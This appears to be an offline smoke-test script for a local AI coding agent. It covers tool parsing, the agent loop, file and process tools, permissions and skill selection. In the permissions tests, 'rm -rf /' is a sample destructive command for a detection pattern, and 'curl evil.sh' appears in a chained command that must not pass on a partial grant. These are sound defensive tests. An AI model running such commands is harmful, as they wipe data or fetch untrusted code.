"""Offline smoke tests — exercise everything that does NOT need a live model.

Run:  python -m tests.smoke_test   (or the venv python)
These give confidence the plumbing is correct before you copy GT to the PC.
"""

import sys
from pathlib import Path

# make 'gt' importable when run from the project root
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from gt.config import Config
from gt.agent import extract_tool_call
from gt.memory import chunk_text
from gt.tools import (tool_docs, REGISTRY, active_tools, _unwrap_ddg,
                      Ctx, ReadFile, WriteFile, ListDir)
from gt.router import Router
from gt.ui import streaming_markdown
from rich.console import Console

ok = 0
fail = 0


def check(name, cond):
    global ok, fail
    if cond:
        ok += 1
        print(f"  ✓ {name}")
    else:
        fail += 1
        print(f"  ✗ {name}")


print("config.yaml loads and resolves roles")
cfg = Config.load()
brain = cfg.model_for("brain")
check("brain role resolves to a url", brain["base_url"].startswith("http"))
check("embed role exists", "embed" in cfg.models)

print("\ntool-call extraction from model text")
check("parses a fenced json tool call",
      extract_tool_call('sure!\n```json\n{"tool":"read_file","args":{"path":"a.py"}}\n```')
      == {"tool": "read_file", "args": {"path": "a.py"}})
check("returns None for plain prose",
      extract_tool_call("Here is your final answer, no tools needed.") is None)
check("takes the LAST tool call when several appear",
      extract_tool_call('```json\n{"tool":"list_dir","args":{}}\n```\n'
                        '```json\n{"tool":"read_file","args":{"path":"z"}}\n```')["tool"]
      == "read_file")
check("defaults missing args to {}",
      extract_tool_call('```json\n{"tool":"list_dir"}\n```') == {"tool": "list_dir", "args": {}})

print("\nturn digest + context assembly (agent-loop memory between turns)")
from gt.agent import digest_line, Agent
from gt.prompts import build_system, turn_context
check("digest remembers a command and its outcome",
      digest_line("run_command", {"command": "npm install"}, "exit code: 0\nstdout: ...")
      == "- run_command(npm install) -> exit code: 0")
check("digest keeps the user's ask_user answer",
      "react + Node" in digest_line("ask_user", {"question": "Stack?"},
                                    "The user answered: react + Node"))
check("digest truncates huge args", len(digest_line(
      "write_file", {"path": "x" * 500}, "OK")) < 300)
sys_prompt = build_system("C:/work", "Windows", "tools...")
check("system prompt is static (no per-turn slots left)",
      "{skills}" not in sys_prompt and "{memory}" not in sys_prompt)
check("system prompt is deterministic (cache-stable)",
      sys_prompt == build_system("C:/work", "Windows", "tools..."))
check("turn_context passes plain requests through untouched",
      turn_context("fix the bug") == "fix the bug")
tc = turn_context("make a page", skills_block="PLAYBOOK", memory_block="LESSON")
check("turn_context attaches playbooks + memory to the user message",
      "PLAYBOOK" in tc and "LESSON" in tc and tc.endswith("make a page"))

print("\ncontext-window fitting (compacts oldest tool output)")
_fit = Agent._fit_context
class _FakeAgent:
    config = cfg
big = "x" * 8000
msgs = ([{"role": "system", "content": "SYS"}]
        + [{"role": "user", "content": f"[tool result: run_command]\n{big}"}
           for _ in range(6)]
        + [{"role": "user", "content": "latest question"}])
check("over-budget messages get compacted", _fit(_FakeAgent(), msgs) is True)
check("oldest tool result was shrunk", len(msgs[1]["content"]) < 1000)
check("most recent tool results kept intact", len(msgs[6]["content"]) > 7000)
check("system prompt untouched", msgs[0]["content"] == "SYS")
small = [{"role": "system", "content": "SYS"},
         {"role": "user", "content": "hi"}]
check("small conversations are left alone", _fit(_FakeAgent(), small) is False)

print("\nagent loop end-to-end (stubbed LLM — no model needed)")
import io
from rich.console import Console as _Console

class _StubLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        reply = ('```json\n{"tool":"list_dir","args":{"path":"."}}\n```'
                 if self.calls == 1 else "Done — I listed the folder.")
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply

class _Stub:
    def route(self, msg): return "fast"
    def search(self, *a, **k): return []
    def learn(self, *a, **k): return None

_quiet = _Console(file=io.StringIO())
_agent = Agent(llm=_StubLLM(), config=cfg, memory=_Stub(), router=_Stub(),
               console=_quiet, improver=_Stub(),
               approve=lambda *a, **k: True, ask=None)
answer = _agent.run("what files are here?")
check("loop runs tool then returns the final answer",
      answer == "Done — I listed the folder.")
check("turn lands in history as user+assistant pair", len(_agent.history) == 2)
check("history assistant entry carries the action digest",
      "[actions taken this turn]" in _agent.history[1]["content"]
      and "list_dir" in _agent.history[1]["content"])
_agent.reset()
check("reset clears history and session-injection tracking",
      not _agent.history and not _agent._seen_skills)

print("\nchunking")
chunks = chunk_text("x" * 2500, size=1000, overlap=150)
check("long text splits into overlapping chunks", len(chunks) == 3)
check("empty text -> no chunks", chunk_text("") == [])

print("\ntool registry + docs")
check("all 16 tools registered", len(REGISTRY) == 16)
check("process tools registered",
      {"check_process", "stop_process"} <= set(REGISTRY))
check("write_todos (task checklist) registered", "write_todos" in REGISTRY)
check("tool_docs mentions run_command", "run_command" in tool_docs())
check("tool_docs mentions web_search", "web_search" in tool_docs())
check("office tools registered",
      {"create_excel", "create_powerpoint", "create_word"} <= set(REGISTRY))
check("ask_user registered", "ask_user" in REGISTRY)

print("\nweb tools can be gated by config")
check("web enabled -> web_search present",
      any(t.name == "web_search" for t in active_tools(cfg)))
cfg.web = {"enabled": False}
check("web disabled -> web_search dropped",
      all(t.name != "web_search" for t in active_tools(cfg)))
check("web disabled -> file tools still present",
      any(t.name == "read_file" for t in active_tools(cfg)))
cfg.web = {"enabled": True}

print("\nDuckDuckGo redirect unwrapping (no network)")
check("extracts uddg target",
      _unwrap_ddg("//duckduckgo.com/l/?uddg=https%3A%2F%2Fexample.com%2Fa&rut=x")
      == "https://example.com/a")
check("adds scheme to //links", _unwrap_ddg("//example.com/x") == "https://example.com/x")
check("passes normal urls through",
      _unwrap_ddg("https://example.com") == "https://example.com")

print("\nstreaming markdown renderer (no model)")
_c = Console()
with streaming_markdown(_c) as (on_token, buf):
    for tok in ["# Hi\n", "some ", "**bold** ", "text\n", "```py\nx=1\n```"]:
        on_token(tok)
check("buffer accumulates streamed tokens", buf.text.endswith("```"))
check("renderer ran without error", buf.text.startswith("# Hi"))

print("\nfile tools actually work (write -> read -> list)")
tmp = Path(__file__).resolve().parent / "_tmp"
tmp.mkdir(exist_ok=True)
ctx = Ctx(cwd=tmp, memory=None, approve=lambda *_, **__: True, config=cfg)
WriteFile().run({"path": "hello.txt", "content": "hi there"}, ctx)
check("read_file returns what write_file wrote",
      ReadFile().run({"path": "hello.txt"}, ctx) == "hi there")
check("list_dir sees the new file", "hello.txt" in ListDir().run({"path": "."}, ctx))
check("approval denial blocks a write",
      "DENIED" in WriteFile().run(
          {"path": "no.txt", "content": "x"},
          Ctx(cwd=tmp, memory=None, approve=lambda *_, **__: False, config=cfg)))

print("\nwrite_todos — the external task checklist (anti-flappy-bird)")
from gt.tools import WriteTodos, render_todos
_tctx = Ctx(cwd=tmp, memory=None, approve=lambda *_, **__: True, config=cfg, todos=[])
_tr = WriteTodos().run({"todos": [
    {"task": "scaffold the game file", "status": "done"},
    {"task": "add the game loop", "status": "doing"},
    {"task": "open it in the browser", "status": "pending"}]}, _tctx)
check("write_todos replaces the shared checklist in place", len(_tctx.todos) == 3)
check("write_todos reports progress and the current item",
      "1/3 done" in _tr and "add the game loop" in _tr)
check("write_todos coerces bare strings to pending items",
      WriteTodos().run({"todos": ["just do the thing"]}, _tctx)
      and _tctx.todos[0]["status"] == "pending")
check("write_todos normalises an unknown status to pending",
      WriteTodos().run({"todos": [{"task": "x", "status": "banana"}]}, _tctx)
      and _tctx.todos[0]["status"] == "pending")
check("write_todos rejects a non-list", "ERROR" in WriteTodos().run(
      {"todos": "nope"}, _tctx))
check("render_todos shows a checkbox per item",
      "[x]" in render_todos([{"task": "a", "status": "done"}])
      and "[ ]" in render_todos([{"task": "b", "status": "pending"}]))

print("\nask_user tool")
from gt.tools import AskUser
ask_ctx = Ctx(cwd=tmp, memory=None, approve=lambda *_, **__: True, config=cfg,
              ask=lambda q: "use React")
check("ask_user relays the user's answer",
      "use React" in AskUser().run({"question": "Which frontend?"}, ask_ctx))
check("ask_user handles no-input mode",
      "ERROR" in AskUser().run({"question": "x"},
                               Ctx(cwd=tmp, memory=None,
                                   approve=lambda *_, **__: True, config=cfg)))
for _ in range(2):  # 2 more asks -> budget of 3 used up
    AskUser().run({"question": "another?"}, ask_ctx)
check("ask_user cuts off after 3 questions per task",
      "used all 3 questions" in AskUser().run({"question": "a 4th?"}, ask_ctx))

print("\nask_user won't hand the user's own question back (the internet bug)")
from gt.tools import _echoes_user, capability_summary, _file_preview
check("detects a verbatim echo",
      _echoes_user("Can you use the internet?", "can you use the internet?"))
check("detects a question that's a subset of what the user said",
      _echoes_user("use the internet", "can you use the internet please"))
check("a genuinely new decision is NOT an echo",
      not _echoes_user("Which port should the API use?", "build me a todo app"))
_asked = []
_echo_ctx = Ctx(cwd=tmp, memory=None, approve=lambda *_, **__: True, config=cfg,
                ask=lambda q: _asked.append(q) or "whatever",
                user_msg="can you use the internet?")
_er = AskUser().run({"question": "Can you use the internet?"}, _echo_ctx)
check("an echoed question is blocked before the user is ever prompted",
      "ANSWER it directly" in _er and _asked == [])
check("blocking an echo does not spend the ask budget",
      _echo_ctx.state.get("asks", 0) == 0)

print("\ncapability summary is truthful about what GT can do (web on/off)")
check("summary lists web access when web is on",
      "search the web" in capability_summary(active_tools(cfg)))
cfg.web = {"enabled": False}
check("summary drops all web access when web is off",
      "web" not in capability_summary(active_tools(cfg)))
cfg.web = {"enabled": True}
check("summary always lists file writing", "write files" in capability_summary())
check("system prompt injects the capability list",
      "search the web" in build_system("C:/w", "Windows", "tools",
                                        capabilities="search the web"))

print("\nwrite-permission preview is a summary, not the whole file")
_big = "\n".join(f"<div>line {i}</div>" for i in range(200))
_prev = _file_preview(_big)
check("preview shows a size line", "200 lines" in _prev)
check("preview is far smaller than the file it describes", len(_prev) < len(_big))
check("preview truncates with a +more marker", "+194 more lines" in _prev)
check("empty content -> empty-file note", _file_preview("") == "(empty file)")

print("\nrun_command: cwd / timeout / background")
import sys as _sys
from gt.tools import RunCommand, CheckProcess, StopProcess, BACKGROUND
run_ctx = Ctx(cwd=tmp, memory=None, approve=lambda *_, **__: True, config=cfg)
check("run_command declares cwd/timeout/background args",
      {"command", "cwd", "timeout", "background"} <= set(RunCommand().args))
sub = tmp / "subdir"
sub.mkdir(exist_ok=True)
py = f'"{_sys.executable}"'
r = RunCommand().run(
    {"command": f"{py} -c \"import os; print(os.getcwd())\"", "cwd": "subdir"},
    run_ctx)
check("cwd arg runs the command in the subfolder", "subdir" in r)
check("missing cwd is a clear error",
      "cwd does not exist" in RunCommand().run(
          {"command": "echo hi", "cwd": "nope"}, run_ctx))
r = RunCommand().run(
    {"command": f"{py} -u -c \"print('start'); import time; time.sleep(60)\"",
     "timeout": 5}, run_ctx)
check("timeout kills the command and says so", "killed after 5s" in r)
check("timeout returns partial output", "start" in r)
check("timeout suggests background mode", "background" in r)
r = RunCommand().run(
    {"command": f"{py} -u -c \"print('serving'); import time; time.sleep(60)\"",
     "background": True}, run_ctx)
check("background start returns a process id", "started background process" in r)
check("background start captures early output", "serving" in r)
pid = int(r.split("background process ")[1].split(":")[0])
check("check_process reports RUNNING",
      "RUNNING" in CheckProcess().run({"id": pid}, run_ctx))
check("stop_process stops it", "OK: stopped" in StopProcess().run({"id": pid}, run_ctx))
import time as _time
_time.sleep(0.5)
check("check_process reports EXITED after stop",
      "EXITED" in CheckProcess().run({"id": pid}, run_ctx))
check("unknown process id is a clear error",
      "ERROR" in CheckProcess().run({"id": 999}, run_ctx))
r = RunCommand().run(
    {"command": f"{py} -c \"import sys; sys.exit(3)\"", "background": True},
    run_ctx)
check("instant crash in background is reported", "exited immediately" in r)

print("\nleading `cd X &&` folds into the working directory")
r = RunCommand().run(
    {"command": f"cd subdir && {py} -c \"import os; print(os.getcwd())\""},
    run_ctx)
check("cd X && cmd runs inside X", "subdir" in r and "exit code: 0" in r)
r = RunCommand().run(
    {"command": f"cd subdir && {py} -c \"import os; print(os.getcwd())\"",
     "cwd": "subdir"}, run_ctx)
check("the doubled cd (cwd arg + cd prefix) no longer fails",
      "exit code: 0" in r and "No such file" not in r)
r = RunCommand().run({"command": "cd nowhere-real && echo hi"}, run_ctx)
check("unresolvable cd target is left for the shell to report",
      "exit code: 0" not in r)

print("\ndigest marks failures loudly")
check("failed command flagged in digest",
      digest_line("run_command", {"command": "x"},
                  "exit code: 1\nstderr: boom").startswith("- FAILED "))
check("error result flagged in digest",
      digest_line("read_file", {"path": "x"},
                  "ERROR: file not found").startswith("- FAILED "))
check("exit code 0 is not a failure",
      not digest_line("run_command", {"command": "x"},
                      "exit code: 0").startswith("- FAILED"))

print("\ngive-up nudge: prose after a failed step doesn't end the turn")
class _GiveUpLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        reply = {1: '```json\n{"tool":"read_file","args":{"path":"missing.txt"}}\n```',
                 2: "Hmm, that failed. Let me try again to read the file.",
                 3: "The file does not exist — nothing to read."}[self.calls]
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply
_gagent = Agent(llm=_GiveUpLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
answer = _gagent.run("read missing.txt")
check("nudge forces a third model call after the give-up prose",
      _gagent.llm.calls == 3)
check("the post-nudge reply becomes the final answer",
      answer == "The file does not exist — nothing to read.")

print("\nstall detection: announcements and echoes don't end the turn")
from gt.agent import _INTENT
check("intent prose detected",
      bool(_INTENT.search("I'll proceed with setting up the React frontend. "
                          "Let me create the project structure.")))
check("'Let me now create' detected", bool(_INTENT.search("Let me now create main.py")))
check("closing courtesy 'Let me know…' is NOT intent",
      not _INTENT.search("All done — the app is running on port 8000. "
                         "Let me know if you need anything else."))
check("plain summary is NOT intent",
      not _INTENT.search("The server is running and serving the frontend."))

class _AnnounceLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        reply = {1: "I'll proceed with creating the files. Let me create them now.",
                 2: '```json\n{"tool":"list_dir","args":{"path":"."}}\n```',
                 3: "Done — the folder is listed."}[self.calls]
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply
_aagent = Agent(llm=_AnnounceLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
check("announcement is nudged into acting (3 calls, real answer)",
      _aagent.run("build it") == "Done — the folder is listed."
      and _aagent.llm.calls == 3)

class _EchoLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        reply = {1: "The frontend is pending and the setup awaits.",
                 2: '```json\n{"tool":"list_dir","args":{"path":"."}}\n```',
                 3: "Finished the setup for real this time."}[self.calls]
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply
_eagent = Agent(llm=_EchoLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
_eagent.history = [
    {"role": "user", "content": "build it"},
    {"role": "assistant",
     "content": "The frontend is pending and the setup awaits."
                "\n\n[actions taken this turn]\n- list_dir(.) -> ok"},
]
check("verbatim repeat of last answer is nudged into acting",
      _eagent.run("yes") == "Finished the setup for real this time.")

print("\nwrite_file content-block protocol (no JSON-escaping of file bodies)")
from gt.agent import attach_content_block
_reply = ('```json\n{"tool": "write_file", "args": {"path": "app.py"}}\n```\n'
          '```python\nprint("a")\nprint(\'b\')\n# no escaping needed\n```')
_call = extract_tool_call(_reply)
attach_content_block(_call, _reply)
check("content lifted from the second fence",
      _call["args"]["content"] == 'print("a")\nprint(\'b\')\n# no escaping needed\n')
_call2 = {"tool": "write_file", "args": {"path": "x", "content": "explicit"}}
attach_content_block(_call2, _reply)
check("explicit content is never overridden", _call2["args"]["content"] == "explicit")
_call3 = {"tool": "run_command", "args": {"command": "ls"}}
attach_content_block(_call3, _reply)
check("only write_file gets a content block", "content" not in _call3["args"])

class _FenceLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        reply = {1: ('```json\n{"tool": "write_file", "args": '
                     '{"path": "fenced.txt"}}\n```\n'
                     '```\nhello from the fence\n```'),
                 2: "Wrote the file."}[self.calls]
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply
_fagent = Agent(llm=_FenceLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
_fagent.cwd = tmp
check("agent loop writes the fenced content to disk",
      _fagent.run("write it") == "Wrote the file."
      and (tmp / "fenced.txt").read_text(encoding="utf-8")
      == "hello from the fence\n")
(tmp / "fenced.txt").unlink(missing_ok=True)

class _BadJsonLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        reply = {1: '```json\n{"tool": "write_file", "args": {"path": "a.txt", '
                    '"content": "line1\\nline2',      # truncated mid-string
                 2: '```json\n{"tool":"list_dir","args":{"path":"."}}\n```',
                 3: "Wrote the file after fixing my JSON."}[self.calls]
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply
_bagent = Agent(llm=_BadJsonLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
check("truncated tool-call JSON is nudged, not returned as the answer",
      _bagent.run("write a file") == "Wrote the file after fixing my JSON.")

print("\nrun_command survives non-ASCII output (Windows cp1252 crash)")
r = RunCommand().run(
    {"command": f"{py} -c \"print('⚠ npm ✓ émoji 🎉')\""}, run_ctx)
check("unicode output comes back intact", "🎉" in r and "émoji" in r)

print("\nsearch_files: project data/ folders are searchable now")
proj_data = tmp / "data"
proj_data.mkdir(exist_ok=True)
(proj_data / "config.json").write_text('{"secret_setting": 1}', encoding="utf-8")
from gt.tools import SearchFiles
check("finds matches inside a project's data/ folder",
      "secret_setting" in SearchFiles().run(
          {"query": "secret_setting", "path": "."}, run_ctx))
(proj_data / "config.json").unlink()
proj_data.rmdir()

print("\nctrl-c mid-turn keeps the turn's work (stubbed LLM)")
class _InterruptLLM:
    last_metrics = None
    def __init__(self):
        self.calls = 0
    def chat(self, role, messages, **kw):
        self.calls += 1
        if self.calls == 2:
            raise KeyboardInterrupt
        reply = '```json\n{"tool":"list_dir","args":{"path":"."}}\n```'
        if kw.get("on_token"):
            kw["on_token"](reply)
        return reply
_iagent = Agent(llm=_InterruptLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
check("interrupt does not raise out of run()", _iagent.run("list stuff") is None)
check("interrupted turn still lands in history", len(_iagent.history) == 2)
check("the step done before the interrupt is remembered",
      "list_dir" in _iagent.history[1]["content"])

print("\noffice tools produce real files")
from gt.tools import REGISTRY as _REG
r = _REG["create_excel"].run(
    {"path": "t.xlsx", "sheets": [{"name": "S", "headers": ["a", "b"],
                                   "rows": [[1, 2], [3, 4]]}]}, run_ctx)
check("create_excel writes a workbook", r.startswith("OK") and (tmp / "t.xlsx").exists())
r = _REG["create_powerpoint"].run(
    {"path": "t.pptx", "title": "Deck",
     "slides": [{"title": "One", "bullets": ["x"], "notes": "n"}]}, run_ctx)
check("create_powerpoint reports slide count without private APIs",
      r == f"OK: created {tmp / 't.pptx'} with 2 slide(s).")
r = _REG["create_word"].run(
    {"path": "t.docx", "blocks": [{"type": "heading", "text": "H"},
                                  "plain para",
                                  {"type": "bullets", "items": ["i1"]}]}, run_ctx)
check("create_word writes a document", r.startswith("OK") and (tmp / "t.docx").exists())
for _f in ("t.xlsx", "t.pptx", "t.docx"):
    (tmp / _f).unlink(missing_ok=True)

# cleanup
for f in sub.iterdir():
    f.unlink()
sub.rmdir()
(tmp / "hello.txt").unlink(missing_ok=True)
tmp.rmdir()

print("\nhardware evaluation + model tiers")
from gt import machine
hw = machine.probe()
check("probe reports RAM", hw["ram_gb"] > 0)
check("probe reports CPU cores", hw["cores"] > 0)
check("32GB machine -> full tier (14B brain)",
      machine.recommend({"ram_gb": 32, "vram_gb": None})["lineup"]["brain"] == "qwen3:14b")
check("12GB machine -> standard tier (8B brain)",
      machine.recommend({"ram_gb": 12, "vram_gb": None})["lineup"]["brain"] == "qwen3:8b")
check("8GB machine -> minimum tier (3B brain)",
      machine.recommend({"ram_gb": 8, "vram_gb": None})["lineup"]["brain"] == "llama3.2:3b")
check("big GPU beats small RAM",
      machine.recommend({"ram_gb": 8, "vram_gb": 12})["tier"] == "full")
check("nothing ever recommends >14B",
      all("27b" not in m and "28b" not in m
          for t in machine.TIERS.values() for m in t["lineup"].values()))

print("\npermissions")
from gt.permissions import Permissions, command_key, _DANGEROUS
store = Path(__file__).resolve().parent / "_perms.json"
store.unlink(missing_ok=True)
_answers = iter(["a"])
perms = Permissions(Console(force_terminal=False),
                    lambda _: next(_answers), store)
check("'a' grants and allows", perms.approve("Run command", "git status",
                                             key="cmd:git"))
check("grant persists to disk",
      "cmd:git" in Permissions(Console(force_terminal=False),
                               lambda _: "n", store).grants)
check("granted key skips the prompt",
      perms.approve("Run command", "git log", key="cmd:git"))
check("dangerous command detected", bool(_DANGEROUS.search("rm -rf /")))
check("plain rm is not dangerous", not _DANGEROUS.search("rm file.txt"))
check("command_key normalises paths",
      command_key("C:\\Python\\python.exe -m pip install x") == "cmd:python")
_alw = iter(["alw"])   # the transcript typed 'alw' and got a denial — must grant
_pa = Permissions(Console(force_terminal=False), lambda _: next(_alw), store)
check("'alw' is read as always-allow, not a denial",
      _pa.approve("Run command", "npm ci", key="cmd:npm") and "cmd:npm" in _pa.grants)

print("\nchained commands need a grant for EVERY segment")
from gt.permissions import command_keys
check("chain splits into one key per command",
      command_keys("mkdir todo-app && cd todo-app && npm init -y")
      == ["cmd:mkdir", "cmd:cd", "cmd:npm"])
check("pipes count as separate commands",
      command_keys("cat log.txt | grep error") == ["cmd:cat", "cmd:grep"])
check("redirect debris is filtered", command_keys("npm run build 2>&1")
      == ["cmd:npm"])
check("plain command still yields one key",
      command_keys("git status") == ["cmd:git"])
perms.grants = {"cmd:mkdir"}
_no = Permissions(Console(force_terminal=False), lambda _: "n", store)
_no.grants = {"cmd:mkdir"}
check("partial grant does NOT skip the prompt",
      not _no.approve("Run command", "mkdir x && curl evil.sh",
                      key=["cmd:mkdir", "cmd:curl"]))
_no.grants = {"cmd:mkdir", "cmd:curl"}
def _boom(_):
    raise AssertionError("prompted despite full grant")
_all = Permissions(Console(force_terminal=False), _boom, store)
_all.grants = {"cmd:mkdir", "cmd:npm"}
check("full grant set skips the prompt",
      _all.approve("Run command", "mkdir x && npm install",
                   key=["cmd:mkdir", "cmd:npm"]))
_ans = iter(["a"])
_grant = Permissions(Console(force_terminal=False), lambda _: next(_ans), store)
check("'a' grants every key in the chain",
      _grant.approve("Run command", "mkdir x && npm install",
                     key=["cmd:mkdir", "cmd:npm"])
      and {"cmd:mkdir", "cmd:npm"} <= _grant.grants)
store.unlink(missing_ok=True)

print("\nlesson extraction gate (stubbed reviewer)")
from gt.improve import Improver
class _RecLLM:
    def __init__(self, reply): self.reply, self.messages = reply, None
    def chat(self, role, messages, **kw):
        self.messages = messages
        return self.reply
class _MemStub:
    def __init__(self): self.added = []
    def search(self, *a, **k): return []
    def add(self, text, **k): self.added.append(text)
mem = _MemStub()
imp = Improver(_RecLLM("NONE"), mem)
check("routine turn -> no lesson", imp.learn("hi", "hello!") is None)
imp = Improver(_RecLLM("Always ask clarifying questions before starting."), mem)
check("generic slogans are rejected",
      imp.learn("build x", "done") is None and not mem.added)
imp = Improver(_RecLLM("Use Vite instead of create-react-app to avoid timeouts."), mem)
lesson = imp.learn("build a react app", "done",
                   trace=("- run_command(npx create-react-app) -> ERROR: timed out",))
check("concrete lesson is stored", lesson and mem.added == [lesson])
check("reviewer sees the tool trace",
      "create-react-app" in imp.llm.messages[1]["content"])

print("\nskills — expert playbooks matched per request")
from gt.skills import load_skills, select, skills_block
# bundled-only, so these stay deterministic whether or not a big library has
# been imported into ~/.gt/skills/library on this machine.
skills = load_skills(include_library=False)
names = {s.name for s in skills}
check("all 8 shipped playbooks load",
      {"excel", "powerpoint", "frontend", "backend", "code-quality",
       "word-docs", "debugging", "project-setup"} <= names)
check("excel request -> excel playbook",
      [s.name for s in select(skills, "make me an excel file of Q3 sales")]
      [:1] == ["excel"])
check("landing page -> frontend playbook",
      "frontend" in [s.name for s in select(skills, "build a landing page in html")])
check("deck request -> powerpoint playbook",
      "powerpoint" in [s.name for s in select(skills, "turn this into a 5 slide deck")])
check("bug report -> debugging playbook",
      "debugging" in [s.name for s in select(skills, "fix this traceback error")])
check("at most 2 playbooks injected",
      len(select(skills, "debug the code error in my html api backend excel")) <= 2)
# the light 'conversation' playbook is handled by the agent's conversational
# path, not code-turn selection — exclude it here, as the agent does.
_code_pool = [s for s in skills if s.name != "conversation"]
check("no engineering playbook for small talk",
      select(_code_pool, "hello there") == [])
check("block renders with header",
      skills_block(select(skills, "excel please")).startswith("# Expert playbooks"))
check("bundled playbooks stay context-lean (<700 words each)",
      all(s.words < 700 for s in skills))

print("\nskill library import (Agent-Skills -> GT format)")
from gt import skill_import
from gt.skills import Skill, SkillIndex, LIBRARY_DIR
_src = Path(__file__).resolve().parent / "_libsrc"
_out = Path(__file__).resolve().parent / "_libout"
import shutil as _shutil
_shutil.rmtree(_src, ignore_errors=True); _shutil.rmtree(_out, ignore_errors=True)
(_src / "engineering" / "tidy-coder").mkdir(parents=True)
(_src / "engineering" / "tidy-coder" / "SKILL.md").write_text(
    '---\nname: "tidy-coder"\n'
    'description: "Use when the user asks to write clean, minimal code without '
    'over-engineering or extra dependencies."\n---\n'
    '# Tidy Coder\nPrefer the standard library. Delete over add.\n',
    encoding="utf-8")
(_src / ".gemini" / "tidy-coder").mkdir(parents=True)   # a mirror that must be skipped
(_src / ".gemini" / "tidy-coder" / "SKILL.md").write_text(
    '---\nname: "tidy-coder"\ndescription: "mirror copy"\n---\n# dup\n', encoding="utf-8")
_n, _cats, _label = skill_import.import_library(str(_src), _out)
check("importer converts SKILL.md and skips hidden mirror dirs", _n == 1)
_imported = sorted(_out.glob("*.md"))
_txt = _imported[0].read_text(encoding="utf-8")
check("imported skill carries GT front matter", "triggers:" in _txt
      and "category: engineering" in _txt and "name: engineering/tidy-coder" in _txt)
check("triggers are derived and drop the 'use when' boilerplate",
      "clean" in _txt and "minimal" in _txt and "\ntriggers: use," not in _txt)
_lib = load_skills(extra_dirs=[_out], include_library=False)
_ts = next(s for s in _lib if s.name == "engineering/tidy-coder")
check("imported skill parses with its description + category",
      _ts.category == "engineering" and "clean" in _ts.description.lower())
check("Skill.embed_text blends name, description and body",
      "tidy-coder" in _ts.embed_text() and "standard library" in _ts.embed_text())
_shutil.rmtree(_src, ignore_errors=True); _shutil.rmtree(_out, ignore_errors=True)

check("GT ships NO third-party skill content — only first-party core playbooks",
      all(not s.category for s in load_skills()))

print("\nembedding-based skill selection (semantic ranking + graceful fallback)")
_sk = [
    Skill("engineering/minimalist", ["minimal", "simple"], 1, "keep it small", category="engineering"),
    Skill("finance/saas-metrics", ["saas", "arr"], 1, "SaaS finance", category="finance"),
    Skill("excel", ["excel", "xlsx"], 5, "spreadsheets"),
]
class _FakeIndex:
    ready = True
    def similarities(self, query, skills):
        # pretend the query is semantically about minimalist code
        return {"engineering/minimalist": 0.71, "finance/saas-metrics": 0.12, "excel": 0.20}
_ranked = select(_sk, "write the least code possible", limit=2, index=_FakeIndex())
check("embedding index ranks by semantic similarity (no keyword needed)",
      _ranked and _ranked[0].name == "engineering/minimalist")
check("sub-threshold skills are dropped under embedding ranking",
      all(s.name != "finance/saas-metrics" for s in _ranked))
class _NotReady:
    ready = False
    def similarities(self, *a): raise AssertionError("should not be called")
check("a not-ready index falls back to keyword matching",
      [s.name for s in select(_sk, "make an excel file", limit=1, index=_NotReady())]
      == ["excel"])
check("skills_block trims a long imported body to the injection cap",
      "[playbook trimmed]" in skills_block(
          [Skill("x/big", ["x"], 1, "word " * 800)], max_chars=200))

print("\nmode-aware temperature (warm for talk, tight for code)")
cfg.performance["temperature"] = 0.3
cfg.performance["temperature_chat"] = 0.7
_tagent = Agent(llm=_StubLLM(), config=cfg, memory=_Stub(), router=_Stub(),
                console=_quiet, improver=_Stub(),
                approve=lambda *a, **k: True, ask=None)
check("plain conversation runs warm",
      _tagent._turn_temperature("what do you think about rust?") == 0.7)
check("a greeting runs warm", _tagent._turn_temperature("hey how are you") == 0.7)
check("a coding request runs tight",
      _tagent._turn_temperature("fix the bug in main.py") == 0.3)
check("a build/plan request runs tight",
      _tagent._turn_temperature("build me a react app") == 0.3)
# capability questions are conversation even with a stray code word in them
check("'lets test it out, do you have access to the internet?' is conversation",
      _tagent._is_conversational("lets test it out, do you have access to the internet?"))
check("'can you use the internet?' is conversation",
      _tagent._is_conversational("can you use the internet?"))
check("a real build phrased as a question is still work",
      not _tagent._is_conversational("can you build me a todo app?"))
check("plain coding stays work despite the word test",
      not _tagent._is_conversational("fix the failing unit test in main.py"))
# file / folder / office requests are WORK, not chit-chat — so they get the
# tight temperature + tools, NOT the "no tools" conversation playbook.
check("file requests are treated as work",
      not _tagent._is_conversational("read config.yaml")
      and not _tagent._is_conversational("list the files here")
      and not _tagent._is_conversational("what is in package.json"))
check("office-doc requests are treated as work",
      not _tagent._is_conversational("make an excel of Q3 sales")
      and not _tagent._is_conversational("create a 5 slide deck"))
check("chit-chat with an action word stays conversation (no false positive)",
      _tagent._is_conversational("read any good books lately?")
      and _tagent._is_conversational("what do you think about rust?"))
# conversation gets the light conversation playbook, not engineering ones
from gt.skills import load_skills as _ls
check("a conversation playbook ships and is loadable",
      any(s.name == "conversation" for s in _ls(include_library=False)))
